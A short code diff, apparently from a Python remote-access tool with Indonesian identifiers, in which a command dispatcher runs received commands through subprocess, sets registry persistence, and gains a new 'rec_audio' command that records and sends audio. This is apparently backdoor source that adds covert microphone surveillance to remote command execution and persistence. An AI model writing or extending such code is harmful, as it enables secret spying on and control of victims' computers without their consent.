@@ -158,6 +158,8 @@ def jalankan_perintah():
             execute_persistence(nama_registry, file_exe)
         elif perintah == 'help':
             pass
+        elif perintah == 'rec_audio':
+            record_n_send()
         else:
             exe = subprocess.Popen(
             perintah,
